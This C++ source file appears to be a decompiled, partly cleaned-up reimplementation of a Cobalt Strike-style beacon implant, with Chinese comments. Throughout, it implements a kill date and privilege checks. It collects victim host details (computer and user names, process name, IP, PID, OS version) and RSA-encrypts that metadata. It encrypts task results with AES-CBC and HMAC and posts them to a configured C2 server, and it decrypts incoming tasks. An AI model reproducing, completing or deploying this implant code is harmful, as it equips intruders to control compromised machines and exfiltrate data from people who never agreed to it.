#pragma once
#define LTM_DESC

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)
#include "tomcrypt.h"
#include <windows.h>
#include "data_deal.h"
#include "http_tool.h"
#include "ida.h"

int Beacon_kill_data()
{
	//验证函数判断结束日期
	int result;
	struct _SYSTEMTIME SystemTime;
	result = get_DWORD(40);                       // killdate
	if (!result) {
		return result;
	}
	GetLocalTime(&SystemTime);
	return SystemTime.wDay + 100 * (SystemTime.wMonth + 100 * (unsigned int)SystemTime.wYear) >= get_DWORD(40);
}
void __fastcall clean_it(void* Block)
{
	free(*(void**)Block);
	free(Block);
}

void call_sleep(DWORD dwMilliseconds)
{
	//if (get_DWORD(41) && dword_10037E88 <= 0)
	//{
	//	sub_10004325();
	//	(lpAddress)(dword_10037620, Sleep, dwMilliseconds);//与混淆有关
	//}
	//else
	//{
	Sleep(dwMilliseconds);
	//}
}

int Beacon_exit()
{
	HANDLE v0;

	if (get_short(55) == 1)
	{
		if (get_short(39) == 1)
		{
			while (1)
				Sleep(1000);
		}
		ExitThread(0);
	}
	if (get_short(39) != 1)
		ExitProcess(0);
	v0 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ExitProcess, 0, 0, 0);
	return WaitForSingleObject(v0, 0xFFFFFFFF);
}

void init_beacon_key(char* a2)
{
	int out_hash[8];
	unsigned long a5 = 32;
	register_hash(&sha256_desc);
	sha256_idx = find_hash("sha256");
	if (hash_memory(sha256_idx, (const unsigned char*)a2, 16, (unsigned char*)out_hash, &a5))// hash_memory
		exit(1);
	aes_key_hash_ago_16[0] = out_hash[0];
	aes_key_hash_ago_16[1] = out_hash[1];
	aes_key_hash_ago_16[2] = out_hash[2];
	aes_key_hash_ago_16[3] = out_hash[3];
	aes_key_hash_up_16[0] = out_hash[4];
	aes_key_hash_up_16[1] = out_hash[5];
	aes_key_hash_up_16[2] = out_hash[6];
	aes_key_hash_up_16[3] = out_hash[7];
	memcpy(initialization_vector, "abcdefghijklmnop", sizeof(initialization_vector));
	register_cipher(&aes_desc);
	aes_idx = find_cipher("aes");
	if (rijndael_setup((const unsigned char*)aes_key_hash_ago_16, 16, 0, &symmetric_key_0))
		exit(1);
}


int IsWow64(HANDLE a1)
{
	HMODULE v1;
	BOOL(__stdcall * IsWow64Process)(HANDLE, PBOOL);
	int result;
	int v4;

	v4 = 0;
	v1 = GetModuleHandleA("kernel32");
	IsWow64Process = (BOOL(__stdcall*)(HANDLE, PBOOL))GetProcAddress(v1, "IsWow64Process");
	if (!IsWow64Process || (result = IsWow64Process(a1, &v4)) != 0)
		result = v4;
	return result;
}

BOOL sub_1000AD18()
{
	struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
	PSID pSid;
	BOOL IsMember;

	pIdentifierAuthority.Value[0] = 0;
	pIdentifierAuthority.Value[1] = 0;
	pIdentifierAuthority.Value[2] = 0;
	pIdentifierAuthority.Value[3] = 0;
	pIdentifierAuthority.Value[4] = 0;
	pIdentifierAuthority.Value[5] = 5;
	IsMember = AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 0x20u, 0x220u, 0, 0, 0, 0, 0, 0, &pSid);
	if (!IsMember)
		return IsMember;
	if (!CheckTokenMembership(0, pSid, &IsMember))
		IsMember = 0;
	FreeSid(pSid);
	return IsMember;
}

void init_dns_options()
{
	struct WSAData WSAData;

	if (init_WSA != 1)
	{
		if (WSAStartup(0x202u, &WSAData) < 0)
		{
			WSACleanup();
			exit(1);
		}
		init_WSA = 1;
		dns_sleep = get_DWORD(20);                  // .dns-beacon.dns_sleep
		dns_idle = get_DWORD(19);                   // .dns-beacon.dns_idle
		dns_get_A = (int)get_str(61);               // .dns-beacon.get_A
		dns_get_AAAA = (int)get_str(62);            // .dns-beacon.get_AAAA
		dns_get_TXT = (int)get_str(63);             // .dns-beacon.get_TXT
		dns_Listeneroptions_dnsresolver = (int)get_str(66);// dns监听器的配置选项dnsresolver
	}
}

int get_pc_ip(char* name)
{
	struct hostent* v1;
	char** v2;
	int result;
	init_dns_options();
	if (!gethostname(name, 256)
		&& (v1 = gethostbyname(name)) != 0
		&& v1->h_addrtype == AF_INET
		&& (v2 = v1->h_addr_list, *v2))
	{
		result = *(DWORD*)*v2;
	}
	else
	{
		result = 0;
	}
	return result;
}


// 构造元数据信息中的计算名 用户名 进程名
void get_pc_info(struc_3* struc3)
{
	LPOSVERSIONINFOA v1;
	char* v2;
	signed int v3;
	int hostlong;
	CHAR* ComputerName;
	CHAR* UserName;
	char* Buffer;
	char* lpFilename;
	const char* lpFilenamea;
	DWORD pcbBuffer;
	struc_1* struc1;

	struc1 = (struc_1*)init_struc1_malloc_Memory(0x494u);
	v1 = (LPOSVERSIONINFOA)get_ptr_struc1_index2_OffsetN(struc1, 148);
	Buffer = (char*)get_ptr_struc1_index2_OffsetN(struc1, 256);
	ComputerName = (CHAR*)get_ptr_struc1_index2_OffsetN(struc1, 256);
	UserName = (CHAR*)get_ptr_struc1_index2_OffsetN(struc1, 256);
	lpFilename = (char*)get_ptr_struc1_index2_OffsetN(struc1, 256);
	pcbBuffer = 256;
	GetUserNameA(UserName, &pcbBuffer);
	pcbBuffer = 256;
	GetComputerNameA(ComputerName, &pcbBuffer);
	hostlong = get_pc_ip(lpFilename);
	if (!GetModuleFileNameA(0, lpFilename, 0x100u)
		|| (v2 = strrchr(lpFilename, 92)) == 0
		|| (lpFilenamea = v2 + 1, v2 == (char*)-1))
	{
		lpFilenamea = Default_process_name;
	}
	v1->dwOSVersionInfoSize = 148;
	GetVersionExA(v1);
	dwMajorVersion = v1->dwMajorVersion;
	push_byte_struc3(struc3, dwMajorVersion);
	push_byte_struc3(struc3, v1->dwMinorVersion);
	push_short_struc3(struc3, LOWORD(v1->dwBuildNumber));
	push_dowrd_struc3(0, struc3);
	push_dowrd_struc3((u_long)GetModuleHandleA, struc3);
	push_dowrd_struc3((u_long)GetProcAddress, struc3);// 把函数这两个重要的函数地址也保持起来
	push_dowrd_struc3(hostlong, struc3);
	_snprintf(Buffer, 0x100u, "%s\t%s\t%s", ComputerName, UserName, lpFilenamea);// 计算机名 用户名 自身进程名
	v3 = strlen(Buffer);
	if (v3 > 58)
		v3 = 58;                                    // 不能超过58字节
	push_N_struc3(v3, struc3, Buffer);
	free_struc1(struc1);
}



int rsa_encrypt(char* rsa_Public_key, void* Src, size_t Size, char* a4, int* a5)
{
	int prng_idx;
	int result;
	rsa_key v8;

	CryptoScheme = get_short(31);
	register_prng(&sprng_desc);
	prng_idx = find_prng("sprng");

	ltc_mp = ltm_desc;

	//LTC_LTC_PKCS_1_V1_5
	if (rsa_import((const unsigned char*)rsa_Public_key, 162, &v8) ||
		(result = rsa_encrypt_key_ex((const unsigned char*)Src, Size, (unsigned char*)a4,
			(unsigned long*)a5, (const unsigned char*)"lparam", 6, NULL, prng_idx, sha256_idx, 1, &v8)) != 0)
	{
		exit(1);
	}

	return result;
}


void* Generate_encryption_metadata(char* Metadata, int size)
{
	DWORD v2;
	DWORD v3;
	HANDLE* v4;
	DWORD pid;
	DWORD Metadata_size;
	char* rsa_publickey;
	BYTE beacon_key[16];
	struc_3 Metadata_struc3;
	UINT oem;
	UINT codepage;
	char v13[4];

	codepage = GetACP();//获得系统的代码页编码
	oem = GetOEMCP();
	v13[0] = 0;
	random_byte_N(beacon_key, 16);// 产生随机的16个字节
	init_beacon_key((char*)beacon_key);//初始化aes相关数据并产生key
	srand(GetTickCount() ^ GetCurrentProcessId());
	dword_1003B308 = call_random_dword_4();            // 随机产生一个4字节
	dword_1003AF00 = dword_1003B308;
	if (ret_0())//ret 0
	{
		v13[0] = 2;
	}
	else
	{
		if (!IsWow64(GetCurrentProcess()))                    // 确定指定进程是否运行在64位操作系统的32环境
			goto LABEL_5;
	}
	v13[0] |= 4;
LABEL_5:
	if (sub_1000AD18())
		v13[0] |= 8u;
		init_struc3(&Metadata_struc3, (DWORD*)Metadata, size);//初始化结构体三准备构造元数据
	
	push_N_struc3(16, &Metadata_struc3, beacon_key);
	push_N_struc3(2, &Metadata_struc3, &codepage);
	push_N_struc3(2, &Metadata_struc3, &oem);
	push_dowrd_struc3(dword_1003B308, &Metadata_struc3);
	pid = GetCurrentProcessId();
	push_dowrd_struc3(pid, &Metadata_struc3);
	push_short_struc3(&Metadata_struc3, 0);
	push_byte_struc3(&Metadata_struc3, v13[0]);
	get_pc_info(&Metadata_struc3);//添加pc的一些信息
	Metadata_size = sub_10001C90(&Metadata_struc3);//返回组装好的元数据大小
	memset(Global_encryption_Metadata, 0, 0x400);
	Global_encryption_Metadata_size = 128;
	memcpy(Global_encryption_Metadata, Metadata, Metadata_size);// copy元数据准备加密
	rsa_publickey = get_str(7);//获取rsa公钥
	rsa_encrypt(rsa_publickey, Metadata, Metadata_size, Global_encryption_Metadata, &Global_encryption_Metadata_size);// rsa加密
	return memset(Metadata, 0, Metadata_size);
}


int aes_cbc_encrypt(int a1, char* in)
{
	int v2;
	int a4;

	v2 = a1;
	a4 = 16;
	for (int i = a1 % 16; i; ++v2)
	{
		if (i >= 16)
			break;
		++i;
	}
	if (CryptoScheme)
	{
		if (CryptoScheme != 1) {
			exit(1);
		}
	}

	else if (cbc_start(aes_idx, (const unsigned char*)initialization_vector, (const unsigned char*)aes_key_hash_ago_16, 16, 0, (symmetric_CBC*)&dword_10033C78)
		|| cbc_encrypt((const unsigned char*)in, (unsigned char*)in, v2, &dword_10033C78)
		|| cbc_done((symmetric_CBC*)&dword_10033C78))
	{
		exit(1);
	}
	if (hmac_memory(sha256_idx, (const unsigned char*)aes_key_hash_up_16, 16, (const unsigned char*)in, v2, (unsigned char*)(&in[v2]), (unsigned long*)&a4)) {
		exit(1);
	}

	return v2 + 16;
}






BOOL send_generate_Metadata()
{
	HANDLE result;
	int v1;
	char* http_post_client_1024;
	char* v3;
	void* hRequest;
	void* v5;
	DWORD v6;
	size_t v7;
	CHAR* szObjectName;
	char v9[1023];
	char enc_Metadata[128];
	LPCSTR lpszAcceptTypes[2];
	struc_2 lpszHeaders;
	int v13;
	// 构造元数据发送元数据
	lpszAcceptTypes[0] = "*/*";
	lpszAcceptTypes[1] = 0;
	szObjectName = (char *)malloc(0x400);
	memset(v9, 0, sizeof(v9));
	enc_Metadata[0] = 0;
	memset(&enc_Metadata[1], 0, 0x7Fu);
	lpszHeaders.lpszHeaders = 0;
	memset(&lpszHeaders.field_1, 0, 0x20u);
	if (!Globala6)
		return Globala6;
	init_struc2(Globala6, &lpszHeaders);
	_snprintf((char* const)lpszHeaders.http_get_url, 0x400u, "%s", Global_http_post_uri);
	_snprintf(enc_Metadata, 0x80u, "%d", dword_1003AF00);
	v1 = strlen(enc_Metadata);
	v7 = Globala6;
	v5 = Globa_unknown_data;
	http_post_client_1024 = get_str(13);          // .http-post.client
	encode_Metadata(http_post_client_1024, &lpszHeaders, enc_Metadata, v1, v5, v7);
	if ((char*)lpszHeaders.field_1 + strlen((const char*)lpszHeaders.field_1) + 1 == (char*)lpszHeaders.field_1 + 1)
		_snprintf(szObjectName, 0x400u, "%s", (const char*)lpszHeaders.http_get_url);
	else
		_snprintf(szObjectName, 0x400u, "%s%s", (const char*)lpszHeaders.http_get_url, (const char*)lpszHeaders.field_1);
	Close_token_fake();
	v13 = 0;
	while (1)
	{
		v6 = dwFlags;
		v3 = get_str(27);
		hRequest = HttpOpenRequestA(hConnect, v3, szObjectName, 0, 0, lpszAcceptTypes, v6, (DWORD_PTR)&dwContext);
		set_http_opt(hRequest);
		HttpSendRequestA(
			hRequest,
			(LPCSTR)lpszHeaders.lpszHeaders,
			strlen((const char*)lpszHeaders.lpszHeaders),
			lpszHeaders.lpOptional,
			lpszHeaders.dwOptionalLength);
		if (is_http_200(hRequest))
			break;
		InternetCloseHandle(hRequest);
		Sleep(500u);
		if ((unsigned int)++v13 >= 4)
			goto LABEL_10;
	}
	InternetCloseHandle(hRequest);
LABEL_10:
	free_struc2_in_struc1(&lpszHeaders);                   // 释放struc_1
	Globala6 = 0;
	free(szObjectName);
	return restore_token_fake();
}

DWORD sub_10002340(u_long out_encrypt_data_len, void* encrypt_data, int a3)
{
	DWORD result;
	u_long v4;
	char* v5;
	size_t v6;

	if (!Globa_unknown_data)
	{
		Globa_unknown_data = (char*)malloc(0x200000u);
	}
	result = out_encrypt_data_len + 4;
	if (out_encrypt_data_len + 4 > 0x200000)
	{
		return result;
	}
	if (Globala6 + out_encrypt_data_len + 4 > 0x200000)
	{
		send_generate_Metadata();
	}
	v4 = htonl(out_encrypt_data_len);
	v5 = Globa_unknown_data;
	v6 = Globala6;
	*(int *)&Globa_unknown_data[Globala6] = v4;
	v6 += 4;
	memcpy(&v5[v6], encrypt_data, out_encrypt_data_len);
	Globala6 = out_encrypt_data_len + v6;
	if (a3)
	{
		result = send_generate_Metadata();
	}
	return result;
}

void* aes_encrypt_ret_data(void* data, size_t data_Size, u_long ret_Task_id, int* out_encrypt_data_len)
{
	void* v4;
	void* buff;
	int v7;
	struc_3 a1;

	v4 = malloc(data_Size + 48);
	buff = v4;
	if (!v4)
	{
		goto LABEL_2;
	}

	init_struc3(&a1, (DWORD*)v4, data_Size + 48);//初始化结构体三准备构造元数据
	
	push_dowrd_struc3(ret_Task_id, &a1);
	push_N_struc3(data_Size, &a1, data);
	v7 = ret_struc3_off_add4(&a1);
	if (v7 <= 0)
	{
		free(buff);
	LABEL_2:
		*out_encrypt_data_len = 0;
		return 0;
	}
	*out_encrypt_data_len = aes_cbc_encrypt(v7, (char*)buff);//aes加密
	return buff;
}



void sub_10001287(void* data, size_t data_Size, u_long ret_Task_id, int a4)
{
	void* encrypt_data;
	void* v5;
	int out_encrypt_data_len;

	out_encrypt_data_len = 0;
	encrypt_data = aes_encrypt_ret_data(data, data_Size, ret_Task_id, &out_encrypt_data_len);//加密内容
	v5 = encrypt_data;
	if (out_encrypt_data_len)
	{
		if (dword_100331A8 == 1)
		{
			sub_10002340(out_encrypt_data_len, encrypt_data, a4);// 发送数据
		}
		free(v5);
	}
}

void sub_10001D10(int a2, void* Src, u_long hostlong)
{
	int v3;
	void* data;
	size_t v5;
	size_t data_len;
	int v7;
	struc_1 v8;
	char* Srca;

	v3 = get_DWORD(28);
	init_struc1_size(&v8, 2 * v3);
	copy_size4_struc1_index2(&v8, a2 + 4);
	copy_size4_struc1_index2(&v8, hostlong);
	copy_N_struc1_index2(&v8, Src, v3 - 8);
	Srca = (char*)Src + v3 - 8;
	v7 = v3 - 8;
	data_len = ret_struc1_index2_size(&v8);
	data = ret_struc1_index1(&v8);
	sub_10001287(data, data_len, 0x1Cu, 1);
	free_struc_1(&v8);                            // 释放struc1
	if (v3 - 8 < a2)
	{
		do
		{
			v5 = a2 - v7;
			if (a2 - v7 > v3)
			{
				v5 = v3;
			}
			sub_10001287(Srca, v5, 0x1Du, 1);
			v7 += v5;
			Srca += v5;
		} while (v7 < a2);
	}
}

void sub_10001DCD(size_t a1, void* Src, u_long ret_Task_id)
{
	if (a1 <= get_DWORD(28))
	{
		sub_10001287(Src, a1, ret_Task_id, 1);
	}
	else
	{
		sub_10001D10(a1, Src, ret_Task_id);
	}
}

void sub_100012CF(void* data, size_t data_Size, u_long ret_Task_id)
{
	if (dword_100331A8 == 1 && get_DWORD(28))
	{
		sub_10001DCD(data_Size, data, ret_Task_id);
	}
	else                                          // sub_100012CF这个函数就是大量其他任务发送返回数据所用的函数
	{
		sub_10001287(data, data_Size, ret_Task_id, 0);
	}
}


int old_Timestamp;
symmetric_CBC symmetric_CBC_0;
size_t Decrypt_return_data(int size, void* Src)
{
	DWORD Timestamp;
	size_t ret_Task_size;
	void* Task_data;
	char hmac_memory_out_buf[16];
	struc_1 struc1_retdata;
	void* Block;


	unsigned long hmac_memory_out_size = 16;
	if (size <= 16)
	{
		return 0;
	}
	unsigned int v5 = size - 16;
	Block = malloc(size - 16);
	if (size % 16)
	{
		free(Block);
		return 0;
	}

	if (hmac_memory(sha256_idx, (const unsigned char*)aes_key_hash_up_16, 16, (const unsigned char*)Src, size - 16, (unsigned char*)hmac_memory_out_buf, &hmac_memory_out_size))
	{
		exit(1);
	}

	if (memcmp((char*)Src + size - 16, hmac_memory_out_buf, 16))
	{
		free(Block);
		return 0;
	}


	if (CryptoScheme)
	{
		if (CryptoScheme != 1)
		{
			exit(1);
		}
		memcpy(Block, Src, v5);
	}

	//aes cbc解密
	else if (cbc_start(aes_idx, (const unsigned char*)initialization_vector, (const unsigned char*)aes_key_hash_ago_16, 16, 0, (symmetric_CBC*)&symmetric_CBC_0)
		|| cbc_decrypt((const unsigned char*)Src, (unsigned char*)Block, v5, &symmetric_CBC_0)
		|| cbc_done((symmetric_CBC*)&symmetric_CBC_0))
	{
		exit(1);
	}

	init_struc1(&struc1_retdata, Block, v5);
	Timestamp = get_int_struc1_index2(&struc1_retdata);// 时间戳

	if (Timestamp + 3600 <= old_Timestamp)
	{
		free(Block);
		//sub_10001F43(old_Timestamp - Timestamp - 3600);
		return 0;
	}
	ret_Task_size = get_int_struc1_index2(&struc1_retdata); // 任务数据长度
	if (!ret_Task_size || ret_Task_size > v5 || (Task_data = get_ptr_struc1_index2_OffsetN(&struc1_retdata, ret_Task_size)) == 0)
	{
		exit(0);
	}

	memcpy(Src, Task_data, ret_Task_size);
	old_Timestamp = Timestamp;
	clear_struc1_index(&struc1_retdata);
	free(Block);
	return ret_Task_size;
}